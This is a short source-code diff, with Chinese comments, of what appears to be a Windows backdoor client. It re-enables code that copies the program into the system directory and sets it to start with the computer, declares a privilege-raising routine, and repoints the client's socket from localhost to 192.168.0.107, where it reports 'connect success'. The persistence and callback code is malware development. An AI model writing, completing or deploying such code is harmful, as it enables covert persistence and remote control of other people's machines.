@@ -14,15 +14,15 @@ bool UpPrivilegeValue();//提权操作
 
 int main()
 {
-	//char pathName[MAX_PATH];//文件名字最大260个字符  MAX_PATH  260
+	char pathName[MAX_PATH];//文件名字最大260个字符  MAX_PATH  260
 
-	//copySelf(pathName);//将文件复制到系统目录
+	copySelf(pathName);//将文件复制到系统目录
 
-	//ComputerStart(pathName);//设置程序开机自启
+	ComputerStart(pathName);//设置程序开机自启
 
 	init_Socket();//创建客户端socket
 
-	SOCKET fd = CreatClientScoket("127.0.0.1");//连接
+	SOCKET fd = CreatClientScoket("192.168.0.107");//连接
 
 	char str[BUFSIZ] = "connect success";//连接成功
 	encode(str);
